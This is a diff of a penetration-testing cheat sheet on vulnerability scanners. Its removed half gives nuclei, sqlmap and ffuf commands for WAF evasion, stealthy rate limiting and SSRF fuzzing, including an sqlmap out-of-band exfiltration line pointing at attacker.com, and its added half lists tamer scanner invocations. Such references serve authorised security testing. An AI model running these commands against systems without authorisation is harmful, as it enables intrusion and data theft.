@@ -1,50 +1,45 @@
-# Vulnerability Scanning Tools: Configuration & Bypass
+# Vulnerability Scanning Tools
 
-## nuclei
+## Web Application Scanners
 
-### Custom Template Execution
-```bash
-# Run specific severities
-nuclei -l targets.txt -t ~/nuclei-templates/ -severity critical,high
-# Run only custom templates (exclude default)
-nuclei -l targets.txt -t ~/custom-templates/ -e ~/nuclei-templates/
-# Exclude specific tags
-nuclei -l targets.txt -t ~/nuclei-templates/ -etags "dos,fuzz,misc"
-```
+### Burp Suite
+- **Active Scan**: Automated crawling + scanning
+- **Passive Scan**: Background analysis without invasive payloads
+- **Extensions**: Autorize, AuthMatrix, Collaborator, Sequencer
 
-### Rate Limiting & OPSEC
-```bash
-nuclei -l targets.txt -t cves/ -rl 50 -c 10 -timeout 5 \
-  --max-host-error 20 -headless-options "-disable-gpu"
-# -rl: rate limit (req/s), -c: concurrency, --max-host-error: skip after N errors
-```
+### OWASP ZAP
+- **Automated Scan**: Quick scan with spider
+- **Active Scan**: Targeted vulnerability detection
+- **HUD**: Heads-up display for manual testing
 
-## WAF Detection
-```bash
-wafw00f https://target.com -a  # Identify WAF vendor
-nmap --script http-waf-fingerprint -p 443 target.com
-```
+## Specialized Scanners
 
-## SQL Injection Automation
+### Nuclei (Template-based)
+`nuclei -u https://target.com -t cves/ -t exposures/ -t misconfigurations/`
 
-### sqlmap (Advanced)
-```bash
-# WAF bypass tamper scripts
-sqlmap -r request.txt --tamper=space2comment,randomcase,charencode --random-agent
-# Deep testing
-sqlmap -r request.txt --level=5 --risk=3 --batch
-# OOB exfiltration
-sqlmap -r request.txt --dns-domain=attacker.com
-# Force DBMS + technique
-sqlmap -r request.txt --dbms=mysql --technique=BT
-```
+### Nikto
+`nikto -h https://target.com`
 
-## SSRF Detection
+### Skipfish
+`skipfish -o output_dir https://target.com`
 
-### Burp Extension: Collaborator Everywhere
-Injects Collaborator URLs into headers and parameters automatically.
+## Cloud Security Scanners
 
-### Manual
-```bash
-ffuf -u https://target.com/api/proxy?url=FUZZ -w ssrf_params.txt -ac
-```
+### AWS
+- **ScoutSuite**: Multi-cloud auditing
+  `ScoutSuite --provider aws`
+- **Prowler**: AWS security assessment
+  `prowler -M text`
+
+### GCP
+- **GCPBucketBrute**: GCP bucket enumeration
+  `gcpbucketbrute -k target`
+
+### Azure
+- **Stormspotter**: Azure attack surface mapper
+
+## API Scanners
+- **Arjun**: HTTP parameter discovery
+  `arjun -u https://target.com/api`
+- **Kiterunner**: API path bruteforce
+  `kr scan https://target.com -w api-routes.txt`
